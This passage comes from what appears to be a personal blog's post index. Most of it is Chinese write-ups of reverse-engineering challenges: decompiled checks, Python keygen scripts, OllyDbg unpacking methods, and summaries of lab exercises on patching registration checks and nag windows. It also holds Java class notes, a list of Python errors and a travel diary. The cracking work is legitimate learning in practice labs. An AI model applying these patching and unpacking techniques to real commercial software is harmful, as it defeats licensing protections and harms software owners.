!sub_401000((int)&amp;v1) ) //需使sub_401000((int)&amp;v1)成真 { sub_402702(&quot;wrong~&quot;); ExitProcess(0); } sub_402702(&quot;Yes,YOU GET IT!&quot;); return 0; } 跟进sub_401000((int)&amp;v1)这个函数 bool __thiscall sub_401000(int this) //this = &amp;v1 { int v1; // eax@1 bool result; // al@2 char v3; // dl@7 char v4[48]; // [sp+0h] [bp-40h]@1 //v4 v5 v6为连续的一个数组 int v5; // [sp+30h] [bp-10h]@1 int v6; // [sp+34h] [bp-Ch]@1 char v7; // [sp+38h] [bp-8h]@1 v1 = *(_BYTE *)this; v5 = 0x2020908; //v4数组内容 v6 = 0x9030106; v7 = 0; if ( v4[v1] != 2 || v4[*(_BYTE *)(this + 1)] != 8 || v4[*(_BYTE *)(this + 2)] != 9 || v4[*(_BYTE *)(this + 3)] != 3 || v4[*(_BYTE *)(this + 4)] != 9 || (v3 = v4[*(_BYTE *)(this + 7)], v4[*(_BYTE *)(this + 5)] != v3) || v4[*(_BYTE *)(this + 6)] != 9 ) //关键 result = 0; else result = v3 == 8; return result; } 通过对关键代码的分析需满足v4[v1] == 2v4[(_BYTE )(this + 1)] == 8v4[(_BYTE )(this + 2)] == 9v4[(_BYTE )(this + 3)] == 3v4[(_BYTE )(this + 4)] == 9v4[(_BYTE )(this + 7)] == v4[(_BYTE )(this + 5)] == v3 == 8v4[(_BYTE )(this + 6)] == 9 又知道数组v4[]的内容v4[] ={8，9，2，2，6，1，3，9} //注意存储的顺序由数组元素下标和数组元素值的对应关系可以推出this[]数组的值即flag为20767070或20161010或30767070或30161010等共16种so flag不唯一 （此题用OD不太方便）此题不难，但是却拖了老长时间，最后还是在看了庆哥的思路后才明白。之后做题要学会自己思考、不畏难、打活思维。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第四周分享会题目 wp","slug":"第四周分享会题目-wp","date":"2017-10-13T05:47:50.000Z","updated":"2018-07-30T13:27:42.839Z","comments":true,"path":"2017/10/13/第四周分享会题目-wp/","link":"","permalink":"http://leo.dropsec.xyz/2017/10/13/第四周分享会题目-wp/","excerpt":"这道题目是国庆中秋放假期间布置的一道题目。","text":"这道题目是国庆中秋放假期间布置的一道题目。 题目下载链接 查壳运行程序，无壳，是一道name&amp;serial类型的题目，基本上就是考察算法。拖进IDA，shift+F12,找到关键字符串，然后反汇编得到关键算法伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax@1 int v4; // eax@5 unsigned int v5; // kr04_4@5 signed int i; // eax@6 char v7; // dl@7 int v9; // [sp+4h] [bp-4Ch]@1 int v10; // [sp+8h] [bp-48h]@1 int v11; // [sp+Ch] [bp-44h]@1 int v12; // [sp+10h] [bp-40h]@1 int v13; // [sp+14h] [bp-3Ch]@1 __int16 v14; // [sp+18h] [bp-38h]@1 char v15; // [sp+1Ah] [bp-36h]@1 int v16; // [sp+1Ch] [bp-34h]@1 int v17; // [sp+20h] [bp-30h]@1 __int16 v18; // [sp+24h] [bp-2Ch]@1 char v19; // [sp+2Bh] [bp-25h]@7 char v20; // [sp+2Ch] [bp-24h]@1 int v21; // [sp+2Dh] [bp-23h]@1 int v22; // [sp+31h] [bp-1Fh]@1 __int16 v23; // [sp+35h] [bp-1Bh]@1 char v24; // [sp+37h] [bp-19h]@1 char v25; // [sp+38h] [bp-18h]@1 v21 = 0; v22 = 0; v23 = 0; v24 = 0; v20 = 0; v16 = 0x7544634D; v17 = 1094741100; v18 = 28277; v9 = 1330405193; v10 = 1130317142; v11 = 6243924; v12 = 976562704; v13 = 53689371; v14 = 8994; v15 = 126; v3 = sub_4013C0(std::cout, &amp;unk_40317C); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, std::endl); sub_401610(std::cin, &amp;v25); //&amp;v25=name if ( strlen(&amp;v25) - 5 &lt;= 3 || strcmp(&amp;v25, (const char *)&amp;v16) ) { printf(Format); //name需要&gt;8 并且需要与&amp;v16进行一一比较，相同为正确 exit(0); } v4 = sub_4013C0(std::cout, &quot;请输入管理员密码：&quot;); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, std::endl); sub_401610(std::cin, &amp;v16); //&amp;v16为输入密码 v5 = strlen((const char *)&amp;v16); if ( v5 - 5 &gt; 6 ) //密码长度需要&lt;=11 { printf(&quot;对不起，您输入的密码错误！&quot;); exit(0); } for ( i = 0; i &lt; (signed int)v5; *(&amp;v19 + i) = v7 ) //关键算法 { v7 = *((_BYTE *)&amp;v12 + i) ^ *((_BYTE *)&amp;v16 + i); ++i; } if ( !strcmp((const char *)&amp;v9, &amp;v20) ) //最终比较 printf(&quot;登陆成功！KEY{管理员密码} \\n&quot;); else printf(&quot;对不起，您输入的密码错误！&quot;); system(&quot;pause&quot;); return 0; } 把关键算法拉下来分析 for ( i = 0; i &lt; (signed int)v5; *(&amp;v19 + i) = v7 ) { v7 = *((_BYTE *)&amp;v12 + i) ^ *((_BYTE *)&amp;v16 + i); ++i; } if ( !strcmp((const char *)&amp;v9, &amp;v20) ) printf(&quot;登陆成功！KEY{管理员密码} \\n&quot;); else printf(&quot;对不起，您输入的密码错误！&quot;); &amp;v12与&amp;v16相与的结果赋给&amp;v7,然后&amp;v7的值付给&amp;v19,最后是让&amp;v9的值与&amp;v20(&amp;v19)的值进行最终比较。想求出正确的&amp;v16,只需让&amp;v9和&amp;v12相与即可得到 正确的name可由之前的&amp;v16得到 写注册机得到密码之前先把&amp;v9与&amp;v12的值找到 list1=[0x49,0x5f,0x4c,0x4f,0x56,0x45,0x5f,0x43,0x54,0x46,0x5f] list2=[0x10,0x2a,0x35,0x3a,0x1b,0x3c,0x33,0x33,0x22,0x23,0x7e] for i,j in zip(list1,list2): print(chr(i^j),end=&apos;&apos;) 运行结果：YuyuMylpve! 最后总结：1.一个遗留问题，不明白为什么&amp;v19突然就变成了&amp;v20 2.还不是特别会利用OD进行解题目（不能利用它找到有用的信息）之后要多加练习 3.现在看看这个算法题目也不是特别难，不明白当时自己为什么就懂不懂。积累经验吧。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"第三周分享会题目 WP","slug":"第三周分享会题目-WP","date":"2017-09-25T12:06:28.000Z","updated":"2018-09-09T09:00:08.356Z","comments":true,"path":"2017/09/25/第三周分享会题目-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/09/25/第三周分享会题目-WP/","excerpt":"第二周分享会题目是暑假布置的三道题，之前称为暑假一练，上周又重新熟悉了一下。这里又来了三道，come on…","text":"第二周分享会题目是暑假布置的三道题，之前称为暑假一练，上周又重新熟悉了一下。这里又来了三道，come on… 一：easy_keygen题目下载链接 运行程序，观察发现又是一道用户名and注册码题目。本道题目已经给出了注册码 5B134977135E7D13 求用户名可知这是一道算法题，拉进IDA分析算法以下为反编译出来的关键代码： int __cdecl main(int argc, const char **argv, const char **envp) { signed int v3; // ebp@1 signed int i; // esi@1 int result; // eax@6 char v6; // [sp+Ch] [bp-130h]@1 // char v7; // [sp+Dh] [bp-12Fh]@1 // 注意地址连续 char v8; // [sp+Eh] [bp-12Eh]@1 // char v9; // [sp+10h] [bp-12Ch]@1 char v10; // [sp+11h] [bp-12Bh]@1 __int16 v11; // [sp+71h] [bp-CBh]@1 char v12; // [sp+73h] [bp-C9h]@1 char v13; // [sp+74h] [bp-C8h]@1 char v14; // [sp+75h] [bp-C7h]@1 __int16 v15; // [sp+139h] [bp-3h]@1 char v16; // [sp+13Bh] [bp-1h]@1 v9 = 0; v13 = 0; memset(&amp;v10, 0, 0x60u); v11 = 0; v12 = 0; memset(&amp;v14, 0, 0xC4u); v15 = 0; v16 = 0; v6 = 16; v7 = 32; // 注意地址连续 v8 = 48; sub_4011B9(aInputName); scanf(aS, &amp;v9); //v9为输入name v3 = 0; for ( i = 0; v3 &lt; (signed int)strlen(&amp;v9); ++i ) { if ( i &gt;= 3 ) i = 0; sprintf(&amp;v13, aS02x, &amp;v13, *(&amp;v9 + v3++) ^ *(&amp;v6 + i)); //关键处，算出的注册码存入v13 } memset(&amp;v9, 0, 0x64u); //重置v9 sub_4011B9(aInputSerial); scanf(aS, &amp;v9); //输入注册码重新存入v9 if ( !strcmp(&amp;v9, &amp;v13) ) //比较 { sub_4011B9(aCorrect); result = 0; } else { sub_4011B9(aWrong); result = 0; } return result; } 重要的在于看懂以下代码 for ( i = 0; v3 &lt; (signed int)strlen(&amp;v9); ++i ) { if ( i &gt;= 3 ) i = 0; sprintf(&amp;v13, aS02x, &amp;v13, *(&amp;v9 + v3++) ^ *(&amp;v6 + i)); //关键处，算出的注册码存入v13 } 不要被sprintf的参数影响。用OD动态调试的时候会看到输入的用户名一个一个的变成了十六进制的形式 结合算法，逆推出以下注册机： 一： serial=[] serial11 = &quot;5B134977135E7D13&quot; for i in serial11.decode(&quot;hex&quot;): #十六进制默认两位两位循环 print(i) #辅助 serial.append(ord(i)) name = [] v6 = [16, 32, 48] i = 0 for v3 in range(len(serial)): if (i &gt;= 3): i= 0 name.append(serial[v3] ^ v6[i]) i = i+1 print(name) namestr = &quot;&quot; for j in range(len(name)): namestr += chr(name[j]) print(namestr) （需在Python 2 下才能正确运行） 二： serial = &quot;5B134977135E7D13&quot; b = [0x10, 0x20, 0x30] a = 0 ss = &apos;&apos; for i in range(0, len(serial), 2): print(hex(int(serial[i:i + 2], 16))) #辅助 ss += chr(int(serial[i:i + 2], 16) ^ b[a]) a += 1 if (a &gt;= 3): a = 0 print(ss) 二：baby_tortoise题目下载链接 先看一下提示：本题的目的是找到OEP查壳查语言运行程序有壳C/C++语言【经验】 C/C++语言写的程序一般会有连续两个jmp跳转到OEP。方法一：转动鼠标滑轮，寻找连续两个jmp，找到后F4，然后F8，越过灰色山丘成功找到OEP。方法二：加载程序后单步，发现符合ESP定律使用的条件。so,选中ESP后的地址右键选择：HW break [ESP]这是快速设置硬件断点的一个方法然后F9，程序停下之后去快捷菜单删除硬件断点F8几步(结合转动鼠标滑轮观察)就看到连续两个jmp了，然后就没有然后了… 三：S0_ea3y题目下载链接 先看一下提示：字符串！字符串！字符串！字符串！还是四遍…无壳，c++语言运行程序看看呗由于提示字符串，直接加载进IDA搜索字符串交叉引用反编译得到关键的伪代码 int __cdecl sub_401080(HWND hDlg) { int result; // eax@5 CHAR String; // [sp+4h] [bp-64h]@1 char v3; // [sp+5h] [bp-63h]@1 //String v3 v4 v5 char v4; // [sp+6h] [bp-62h]@2 //注意地址的连续性 char v5; // [sp+8h] [bp-60h]@3 __int16 v6; // [sp+65h] [bp-3h]@1 char v7; // [sp+67h] [bp-1h]@1 String = 0; memset(&amp;v3, 0, 0x60u); v6 = 0; v7 = 0; GetDlgItemTextA(hDlg, 1000, &amp;String, 100); ** if ( v3 == 97 &amp;&amp; !strncmp(&amp;v4, a5y, 2u) &amp;&amp; !strcmp(&amp;v5, aR3versing) &amp;&amp; String == 69 )** { MessageBoxA(hDlg, Text, Caption, 0x40u); result = EndDialog(hDlg, 0); } else { result = MessageBoxA(hDlg, aIncorrectPassw, Caption, 0x10u); } return result; } 然后根据地址的连续性把比较的字符串连起来得到key：Ea5yR3versing 【注意】 一定不要被变量名误导，要跟进去看它的值；然后就是别忘把对应的ASCII值转成对应的字符","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"跟着崔岩老师学Java","slug":"跟着崔岩老师学Java","date":"2017-09-19T10:39:19.000Z","updated":"2017-11-04T12:37:50.232Z","comments":true,"path":"2017/09/19/跟着崔岩老师学Java/","link":"","permalink":"http://leo.dropsec.xyz/2017/09/19/跟着崔岩老师学Java/","excerpt":"之前在超星算是初步接触过Java，本学期有Java程序设计这门课，我是很高兴的。上过两节课，发现崔岩老师也很给力，更坚定了我学好Java的信心。 这里就用于记录我在崔老师的课堂上的点点收获吧","text":"之前在超星算是初步接触过Java，本学期有Java程序设计这门课，我是很高兴的。上过两节课，发现崔岩老师也很给力，更坚定了我学好Java的信心。 这里就用于记录我在崔老师的课堂上的点点收获吧 2017/9/19 Class命名首字母大写（约定），方法命名都要“传情达意”； Ctrl+Shift+f 自动缩进快捷键 （前提是没有语句漂红）； 桩模块（stub) 详细参考： http://blog.csdn.net/chenyt01/article/details/52216857 交互设计（Interaction Design）：定义、设计人造系统的行为的设计领域，它定义了两个或多个互动的个体之间交流的内容和结构，使之互相配合，共同达成某种目的 学会用程序员的思维去体验产品，体会到一点点feel就是之后自己开发产品时的目标（类似崔老师提到的以上交互设计…) 熟悉键盘： 一分钟至少中文30英文100. 2017/9/22 先接受，再评价；平和心态，没有什么东西是没用的，存在即是合理 学会以工程的思维去编码 (String[],args) &lt;==&gt; (String…,args) 偶然发现 refactor 重构（更改变量名） 程序员要学会“手贱”，用‘删除则不能’的方法搞懂每个东西的作用 Java里面只有void返回类型，不存在用void定义方法类型 对于工具书，先看前言与目录，然后在需要用的时候读 函数里不要有输出语句，运用返回值 main方法里只需有main一个方法即可 log4j插件 日志方式（替换输出) 4==for 2==to 2017/9/26 两个名词：回归测试、分而治之（本节课崔老师主要在示范程序规范与初步介绍debug.） 2017/9/29 【编程思想】：考虑用户不确定的需求，留意程序的本身特性，自己给自己加码工程意识、客户需求、容错性 模块化、函数化、流式化编程（本节课崔老师主要结合课后题目展开介绍编程思想） 2017/10/10 编写代码注意： 要有条理性、学会分而治之、（可配置可变化） （必要的“职业病”是可以有的） 精细的去做几道题目，从中学会扩散的挖掘知识比盲目做大量题目要好一点，在过程中总结体会真正的编程思想 不足之一：看资料看的太慢（知识储备太少） 之后第一遍读东西不用太细致，第一遍要去发掘其中的关键点 扩散——&gt;回车、多动手实践敲代码、又一次提到练打字、所有导包语句都不要自己写 2017/10/13 Ctrl+shift+o 自动导入所需包 Ctrl+shift+f 自动缩进 编译器的报错信息从下往上看 学会看源码。对比自己写的代码学习可学习之处 了解：数组扩容、泛型、多态 2017/10/17与2017/10/20的Java课由于机房预约问题未上，顺延一周 2017/10/24 从jdk 9开始变量名不推荐使用下划线”_”（课堂上，由于我们技能方面表现不佳，崔老师比较生气，未讲太多新知识） 2017/10/27 崔老师演示了创建数组新方法、数组与链表的一键转换以及Iterator 的用法 做工程时有些功能模块要学会引用（学习）别人（大牛）写的代码 要有好奇心呀，好奇心带我们翻越一座座山 2017/10/31 变量设置习惯：a b c…用来设置中间变量 m n o p q…用来设置整数变量 i j k…用来设置循环变量 函数块里尽量不要写输出语句 2017/11/4 @override 用于重写父类方法 了解Java怎么处理大数 哈希表的原理（为什么快） 明确目的。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://leo.dropsec.xyz/tags/Java/"}]},{"title":"新手常见的17个Python运行时错误","slug":"新手常见的17个Python运行时错误","date":"2017-09-05T11:37:37.000Z","updated":"2017-09-05T12:24:07.121Z","comments":true,"path":"2017/09/05/新手常见的17个Python运行时错误/","link":"","permalink":"http://leo.dropsec.xyz/2017/09/05/新手常见的17个Python运行时错误/","excerpt":"早计划学习python了，最近一段时间才缓缓展开行动…自我感觉熟练python后可以很随意的编写程序，比C++方便多。","text":"早计划学习python了，最近一段时间才缓缓展开行动…自我感觉熟练python后可以很随意的编写程序，比C++方便多。 当初学 Python 时，想要弄懂 Python 的错误信息的含义可能有点复杂。这里列出了常见的的一些让你程序 crash 的运行时错误。 1）忘记在 if , elif , else , for , while , class ,def 声明末尾添加 ：（导致 “SyntaxError ：invalid syntax”） 该错误将发生在类似如下代码中： if spam == 42 print(&apos;Hello!&apos;) 2)使用 = 而不是 ==（导致“SyntaxError: invalid syntax”） = 是赋值操作符而 == 是等于比较操作。该错误发生在如下代码中： if spam = 42: print(&apos;Hello!&apos;) 3）错误的使用缩进量。（导致“IndentationError：unexpected indent”、“IndentationError：unindent does not match any outer indetation level”以及“IndentationError：expected an indented block”） 记住缩进增加只用在以：结束的语句之后，而之后必须恢复到之前的缩进格式。该错误发生在如下代码中： print(&apos;Hello!&apos;) print(&apos;Howdy!&apos;) 或者： if spam == 42: print(&apos;Hello!&apos;) print(&apos;Howdy!&apos;) 或者： if spam == 42: print(&apos;Hello!&apos;) 4）在 for 循环语句中忘记调用 len() (导致“TypeError: ‘list’ object cannot be interpreted as an integer”) 通常你想要通过索引来迭代一个list或者string的元素，这需要调用 range() 函数。要记得返回len 值而不是返回这个列表。 该错误发生在如下代码中： spam = [&apos;cat&apos;, &apos;dog&apos;, &apos;mouse&apos;] for i in range(spam): print(spam[i]) 5）尝试修改string的值（导致“TypeError: ‘str’ object does not support item assignment”） string是一种不可变的数据类型，该错误发生在如下代码中： spam = &apos;I have a pet cat.&apos; spam[13] = &apos;r&apos; print(spam) 而你实际想要这样做： spam = &apos;I have a pet cat.&apos; spam = spam[:13] + &apos;r&apos; + spam[14:] print(spam) 6）尝试连接非字符串值与字符串（导致 “TypeError: Can’t convert ‘int’ object to str implicitly”） 该错误发生在如下代码中： numEggs = 12 print(&apos;I have &apos; + numEggs + &apos; eggs.&apos;) 而你实际想要这样做： numEggs = 12 print(&apos;I have &apos; + str(numEggs) + &apos; eggs.&apos;) 或者： numEggs = 12 print(&apos;I have %s eggs.&apos; % (numEggs)) 7）在字符串首尾忘记加引号（导致“SyntaxError: EOL while scanning string literal”） 该错误发生在如下代码中： print(Hello!&apos;) 或者: print(&apos;Hello!) 或者: myName = &apos;Al&apos; print(&apos;My name is &apos; + myName + . How are you?&apos;) 8）变量或者函数名拼写错误（导致“NameError: name ‘fooba’ is not defined”） 该错误发生在如下代码中： foobar = &apos;Al&apos; print(&apos;My name is &apos; + fooba) 或者: spam = ruond(4.2) 或者: spam = Round(4.2) 9）方法名拼写错误（导致 “AttributeError: ‘str’ object has no attribute ‘lowerr’”） 该错误发生在如下代码中： spam = &apos;THIS IS IN LOWERCASE.&apos; spam = spam.lowerr() 10）引用超过list最大索引（导致“IndexError: list index out of range”） 该错误发生在如下代码中： spam = [&apos;cat&apos;, &apos;dog&apos;, &apos;mouse&apos;] print(spam[6]) 11）使用不存在的字典键值（导致“KeyError：‘spam’”） 该错误发生在如下代码中： spam = {&apos;cat&apos;: &apos;Zophie&apos;, &apos;dog&apos;: &apos;Basil&apos;, &apos;mouse&apos;: &apos;Whiskers&apos;} print(&apos;The name of my pet zebra is &apos; + spam[&apos;zebra&apos;]) 12）尝试使用Python关键字作为变量名（导致“SyntaxError：invalid syntax”） Python关键不能用作变量名，该错误发生在如下代码中： class = &apos;algebra&apos; Python3的关键字有：and, as, assert, break, class, continue, def, del, elif, else, except, False, finally, for, from, global, if, import, in, is, lambda, None, nonlocal, not, or, pass, raise, return, True, try, while, with, yield 13）在一个定义新变量中使用增值操作符（导致“NameError: name ‘foobar’ is not defined”） 不要在声明变量时使用0或者空字符串作为初始值，这样使用自增操作符的一句spam += 1等于spam = spam + 1，这意味着spam需要指定一个有效的初始值。 该错误发生在如下代码中： spam = 0 spam += 42 eggs += 42 14）在定义局部变量前在函数中使用局部变量（此时有与局部变量同名的全局变量存在）（导致“UnboundLocalError: local variable ‘foobar’ referenced before assignment”） 在函数中使用局部变来那个而同时又存在同名全局变量时是很复杂的，使用规则是：如果在函数中定义了任何东西，如果它只是在函数中使用那它就是局部的，反之就是全局变量。 这意味着你不能在定义它之前把它当全局变量在函数中使用。 该错误发生在如下代码中： someVar = 42 def myFunction(): print(someVar) someVar = 100 myFunction() 15）尝试使用 range()创建整数列表（导致“TypeError: ‘range’ object does not support item assignment”） 有时你想要得到一个有序的整数列表，所以 range() 看上去是生成此列表的不错方式。然而，你需要记住 range() 返回的是 “range object”，而不是实际的 list 值。 该错误发生在如下代码中： spam = range(10) spam[4] = -1 也许这才是你想做： spam = list(range(10)) spam[4] = -1 （注意：在 Python 2 中 spam = range(10) 是能行的，因为在 Python 2 中 range() 返回的是list值，但是在 Python 3 中就会产生以上错误） 16）不错在 ++ 或者 – 自增自减操作符。（导致“SyntaxError: invalid syntax”） 如果你习惯于例如 C++ , Java , PHP 等其他的语言，也许你会想要尝试使用 ++ 或者 – 自增自减一个变量。在Python中是没有这样的操作符的。 该错误发生在如下代码中： spam = 1 spam++ 也许这才是你想做的： spam = 1 spam += 1 17）忘记为方法的第一个参数添加self参数（导致“TypeError: myMethod() takes no arguments (1 given)”） 该错误发生在如下代码中： class Foo(): def myMethod(): print(&apos;Hello!&apos;) a = Foo() a.myMethod() 原文链接：http://www.oschina.net/question/89964_62779","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://leo.dropsec.xyz/tags/Python/"}]},{"title":"实验吧逆向脱壳 汇总","slug":"实验吧逆向脱壳-汇总","date":"2017-09-01T06:05:41.000Z","updated":"2018-07-30T13:20:31.916Z","comments":true,"path":"2017/09/01/实验吧逆向脱壳-汇总/","link":"","permalink":"http://leo.dropsec.xyz/2017/09/01/实验吧逆向脱壳-汇总/","excerpt":"实验吧的五个逆向脱壳实验，汇总一下。","text":"实验吧的五个逆向脱壳实验，汇总一下。 第1节 ESP定律ESP定理脱壳（ESP在OD的寄存器中，我们只要在命令行下ESP的硬件访问断点，就会一下来到程序的OEP了！）（1）开始就点F8，注意观察OD右上角的寄存器中ESP有没突现（变成红色）（这只是一般情况下，更确切的说我们选择的ESP值是关键句之后的第一个ESP值）当有且只有ESP和EIP为红色时，我们可以用ESP定律了（2）在命令行下：dd XXXXXXXX(指在当前代码中的ESP地址，或者是hr XXXXXXXX)，按回车（3）选中下断的地址，断点—&gt;硬件访问—&gt;WORD断点（4）按一下F9运行程序，直接来到了跳转处，按下F8，到达程序OEP 第2节 SFX定律使用SFX法脱壳的常见步骤： 将OD设置为忽略所有异常 在OD的“调试选项”对话框的“SFX”选项中选择“字节模式跟踪实际入口”，确定 将待脱壳程序拖入OD，程序载入完成后会直接停在OEP处 关于SFX: 第3节 出口标志前面几个脱壳方法中有一个共同点，就是在单步跟踪到popad指令后面不远处的jmp指令的时候，就可以大胆的判断这个jmp指令的目的地址就是OEP。原因很简单，popad指令用于将壳运行之前保存的环境恢复，使原程序能正常运行。有些壳的popad指令很少，我们就可以查看被这种壳加壳的程序的所有popad指令，找到后面存在jmp指令的popad指令，然后来到其后的jmp指令的目的地址，这很可能就是OEP，然后就可以进行dump脱壳了。 使用出口标志法脱壳的常见步骤：1、将待脱壳程序载入OD中，在OD的反汇编客人口中单击鼠标右键，在弹出的右键菜单中单击“查找”→“所有命令”，在弹出的输入框中输入“popad”并按“查找”按钮；2、逐一尝试跟踪查找到的所有“popad”指令，最终达到程序的OEP。 第4节 单步跟踪单步跟踪法的步骤：（1）用OD载入，点“不分析代码”（2）单步向下跟踪F8，实现向下的跳。也就是说向上的跳不让其实现（通过F4）（3）遇到程序往回跳的（包括循环），我们在下一句代码处按F4（或者右健单击代码，选择断点—&gt;运行到所选）（4）绿色线条表示跳转没实现，不用理会，红色线条表示跳转已经实现（5）如果刚载入程序，在附近就有一个CALL的，我们就F7跟进去，不然程序很容易跑飞，这样很快就能到程序的OEP（6）在跟踪的时候，如果运行到某个CALL程序就运行的，就在这个CALL中F7进入（7）一般有很大的跳转（大跨段），比如 jmp XXXXXX 或者 JE XXXXXX 或者有RETN 的一般很快就会到程序的OEP 第5节 内存镜像法内存镜像法的步骤：（1）用OD打开软件（2）点击选项——调试选项——异常，把里面的忽略全部√上。CTRL+F2重载入程序（3）按ALT+M,打开内存镜象，找到程序的第一个.rsrc.按F2下断点，然后按SHIFT+F9运 行到断点，接着再按ALT+M,打开内存镜象，找到程序的第一个.rsrc.上面的代码段.text（或者CODE）（也就是00401000处），按F2下断点。然后按SHIFT+F9（或者是在没异常情况下按F9）， 直接到达程序OEP (亲自在试验机里试了试，怎么发现不可行…)","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"实验吧逆向破解 汇总","slug":"实验吧逆向破解-汇总","date":"2017-08-31T12:40:54.000Z","updated":"2018-07-30T13:20:15.757Z","comments":true,"path":"2017/08/31/实验吧逆向破解-汇总/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/31/实验吧逆向破解-汇总/","excerpt":"用了好长时间看完了这十九个实验，总该有些收获吧，简单汇总一下，方便之后的记忆…","text":"用了好长时间看完了这十九个实验，总该有些收获吧，简单汇总一下，方便之后的记忆… 第1节 暴力破解程序用查找字符串的方法找到关键跳，NOP掉，实现暴力破解。 第2节 获得注册码用查找字符串的方法找到关键代码，追出注册码。 第3节 跳转破解先00401000到达程序入口，查找字符串的方法找到关键跳，修改关键跳指令实现爆破。 第4节 带壳破解 本题是不脱ASPack2.12壳直接寻找注册码 加壳程序载入OD是先载入壳程序，壳程序解密软件。所以需要先跳转到软件解密的地方才可以搜索字符串，加密下是无法找到的 本程序在搜索字符串的时候看到了S哦反弹ware\\engydt，即程序在启动时访问了注册表，提取了用户名与序列号，然后进行对比 然后运用API断点操作后可以跟到注册码第5节 软件文件大小自校验首先用ESP定律脱壳，然后用ImportRECR获取导入表、修正转存…然后在用OD解除文件自校验。用到了API断点找到关键跳转NOP掉就OK了第6节 修改关键CALL返回值先字符串查找到关键跳，关键跳是根据关键CALL返回的值执行的，so,想办法控制CALL返回的值就KO了。第7节 重启验证读取文件字符串查找到关键跳，下断点设置API断点 第8节 万能断点利用万能断点追出注册码，万能断点可以吧程序中可以断下的地方都断下 第9节 VB弹出窗口利用VB弹出函数追出注册码，对于VB程序，在rtcMsBox函数处下断点，然后追出（最后也是NOP的） 第10节 删除弹窗找到弹窗的代码，改变指令跳过或NOP就可以了。 第11节 真码保存在系统文件这个实验没什么好说的… 第12节 BC++手动查找IAT脱壳后手动修复地址表。 第13节 利用dede查找按钮事件如题： 利用dede查找按钮事件，找到关键跳NOP 第14节 ALT+F9关键CALL追注册码ALT+F9关键CALL追注册码 搞得我都不知道如何写。。。 第15节 加壳软件打补丁就是用特定软件改写了一下相关指令的地址，本质类似于jmp 第16节 易语言窗体法更改易语言主窗口弹出代码，使程序跳过注册口，直接弹出用户界面（满满的我不知道的套路） 第17节 易语言退出暗桩修改跳转 第18节 VB按钮脚本破解（满满的我不知道的套路，请看原指导书） 第19节 修改软件标题图标利用PE Explorer修改一下caption选项内容 记忆力下降 理解能力下降","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"OK 天津","slug":"OK-天津","date":"2017-08-28T13:29:17.000Z","updated":"2018-07-30T13:19:46.711Z","comments":true,"path":"2017/08/28/OK-天津/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/28/OK-天津/","excerpt":"8.24–8.28 与三友共浪天津，回来之后迫不及待的想记录一点东西…","text":"8.24–8.28 与三友共浪天津，回来之后迫不及待的想记录一点东西… 多年前的我对天津是有某种情感的，小时候姥爷长期工作于天津，年时总会讲起它的点滴，渐渐的渐渐的便对它有了亲近感。但等姥爷去世后，时间一长那种情感也就渐渐随风而去，数一数，六七年了吧… 如今，走近天津，除了开始的要去追寻这座城的历史，其间也产生了去了解姥爷之前生活的土地的念头。 之于在天津的游玩，是没有必要细说的，简单记录下行踪便可：天津大学北洋园校区、天津市奥体中心全运会预演、东疆建设开发纪念公园、天津之眼(海河)、天津大学老校区、南开大学老校区、五大道古建筑群。 然后要说的便是自己的一些体会了：首先，重新谈一下天津印象，由于地处北方，跟之前有去过的广州、深圳等南方城市相比它是北方味道十足，不论是周遭的植被，还是建筑。其次便是资金流，天津身为直辖市之一本身就极具吸引力，又由于历史、地理位置等因素使其一直稳步向前发展，虽然自我感觉没有前几年发展的快了，但是实力并未减弱，稳中有实形容天津感觉比较恰当。最后便是天津人了，之前知道老北京人说话比较有特点，听后会感觉特别带劲，对于天津人的概念是比较模糊的，今日听闻，发现天津当地人说话同样自带特色，并且感觉和老北京人说话神似，听后心中默念：正宗正宗。 最后的最后抛开天津，谈一谈感想：其一：虽然我们几个可以说都是自诩肚子里有点笔墨的人，但是并不意味着在现实生活中就会比其他人具有某些优势，很多东西我们只会在书本上熟练的运用，实际生活中的行为总会显得有点幼稚、可笑…其二：城市穿梭之间，一浪友对我说感觉大城市都是一样的、都是单调的高楼与乏味的繁华。细细一想，一方水土一方人，人与文化是一座城市的灵魂，现如今我们大部分人都将重心放在了其他地方，对主体的人与人所产生的文化有所忽略，又怎么会去深入的了解这方水土，这座城市呢？因此会感觉不到这方水土这座城市的特色，发出“一样”的感叹。不怪本地的建设者，也怪不得他方的游人。。。 其三：年轻的时候还是有必要到处走走的，去多一点的地方、见多一点的人，虽然这是我的一贯看法，其实自我感觉我做的也不好，有点优柔、有点寡断。读书与运动总要有一个在路上，其中读书不只是表象的阅读有字书本还应包含无字的天地之书。而反思一下，读书与运动这两者我怠慢了好多。 其四：让我发句牢骚：好多你坚信行不通的东西在别人看来可能是行得通的。","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"CrackMe 008","slug":"CrackMe-008","date":"2017-08-24T02:48:28.000Z","updated":"2018-07-30T13:19:12.463Z","comments":true,"path":"2017/08/24/CrackMe-008/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/24/CrackMe-008/","excerpt":"经过了前两天的煎熬，总算遇到一个简单点的题了。。。呜呜呜，我也是很激动(。・∀・)ノ","text":"经过了前两天的煎熬，总算遇到一个简单点的题了。。。呜呜呜，我也是很激动(。・∀・)ノ 